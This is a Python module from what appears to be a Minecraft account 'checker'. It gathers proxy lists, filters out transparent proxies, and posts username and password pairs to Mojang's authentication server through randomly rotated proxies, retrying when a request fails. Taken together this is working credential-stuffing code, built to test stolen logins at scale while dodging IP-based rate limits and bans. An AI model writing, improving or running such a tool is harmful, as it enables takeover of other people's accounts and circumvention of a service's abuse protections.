import ctypes
import json
import platform
import random
import time
from multiprocessing.dummy import Pool as ThreadPool

import colorama
import requests
from termcolor import colored, cprint

import stuff.config_reader
from stuff.config_reader import *
from stuff.file_creator import BASIC_PATH

colorama.init()


class proxy:
    proxys = []
    invalid = 0
    working = []


def proxy_getter():
        if Checker.Proxy.proxy:
            if Checker.Proxy.api_use:
                print('Sending proxy api request')
                proxies = [x for x in requests.get(Checker.Proxy.api_link).content.decode().splitlines() if ":" in x]

            else:
                proxies = [x for x in open(BASIC_PATH + "/proxies.txt").readlines() if ":" in x]

            if Checker.Proxy.proxy_check:
                proxy.proxys = checkproxies(proxies, ProxyChecker.Settings.thread_amount, ProxyChecker.Settings.timeout / 1000, ProxyChecker.Settings.proxy_judge)
            else:
                proxy.proxys = proxies


def account_login(email_username, password):
   try:
       headers = {"content-type": "application/json"}
       request_body = json.dumps({
           'agent': {
               'name': 'Minecraft',
               'version': 1
           },
           'username': email_username,
           'password': password,
           'requestUser': 'true'
       })

       if not stuff.config_reader.Checker.Proxy.proxy:
           answer = requests.post('https://authserver.mojang.com/authenticate', data=request_body, headers=headers).content
       else:
           while True:
               proxyy = str(random.choice(proxy.proxys)).replace("\n", "")

               if Checker.Proxy.type.lower() == "http" or Checker.Proxy.type.lower() == "https":
                   proxy_dict = {
                       'http': "http://" + proxyy,
                       'https': "https://" + proxyy
                   }
               elif Checker.Proxy.type.lower() == "socks4" or Checker.Proxy.type.lower() == "socks5":
                   proxy_dict = {
                       'http': Checker.Proxy.type.lower() + "://" + proxyy,
                       'https': Checker.Proxy.type.lower() + "://" + proxyy
                   }
               try:
                   answer = requests.post('https://authserver.mojang.com/authenticate', data=request_body, headers=headers, proxies=proxy_dict, timeout=15).content
                   break
               except Exception as e:
                   if Checker.debug:
                       print(proxy)
                       print(e)
                   #proxy.proxys.remove(proxyy)
                   #print("\nInvalid request, repeating.")
                   time.sleep(2)
                   continue

       answer_json = json.loads(answer)
   except Exception as e:
       answer_json = 'Invalid credentials'
   return answer_json

def checkproxies(proxies ,threads, timeout, proxyjudge):
    myip = str(requests.get("https://api.ipify.org/").content.decode())

    if platform.system() == "Windows":
        windows = True
    else:
        windows = False
        print("Oh, You are not on Windows -> Turnig off title bar status changer")

    def proxy_checker(x):
        proxie = proxies[x].replace("\n", "")

        if Checker.Proxy.type.lower() == "http" or Checker.Proxy.type.lower() == "https":
            proxy_dict = {
                'http': "http://" + proxie,
                'https': "https://" + proxie
            }
        elif Checker.Proxy.type.lower() == "socks4" or Checker.Proxy.type.lower() == "socks5":
            proxy_dict = {
                'http': Checker.Proxy.type.lower() + "://" + proxie,
                'https': Checker.Proxy.type.lower() + "://" + proxie
            }


        try:
            r = requests.get(proxyjudge, proxies=proxy_dict, timeout=timeout).content.decode()
            if r.__contains__(myip):
                if Checker.Proxy.use_transparent:
                    proxy.working.append(proxies[x])
                    cprint("" + proxie + " Working but transparent", "yellow")
                else:
                    proxy.invalid = proxy.invalid + 1
                    cprint("" + proxie + " Working but transparent", "red")


            else:
                cprint("" + proxie + " Working", "green")
                proxy.working.append(proxies[x])
        except:
            #cprint("\n" + proxie + " Not Working", "red")
            proxy.invalid = proxy.invalid + 1
        if windows:
            ctypes.windll.kernel32.SetConsoleTitleW(
                "MART by scorpion3013 | " +
                "Proxies left: " + str(len(proxies) - (len(proxy.working) + proxy.invalid)) +
                " | Working: " + str(len(proxy.working)) +
                " | Bad: " + str(proxy.invalid))

    def theads_two(numbers, threads=threads):
        pool = ThreadPool(threads)
        results = pool.map(proxy_checker, numbers)
        pool.close()
        pool.join()
        return results

    if __name__ == "stuff.checker":
        countt = []
        for x in range(len(proxies)):
            countt.append(int(x))
        threads_one = theads_two(countt, threads)
    print(colored("\n\nYou have " + str(len(proxy.working)) + " working proxies.", "magenta"))
    return proxy.working
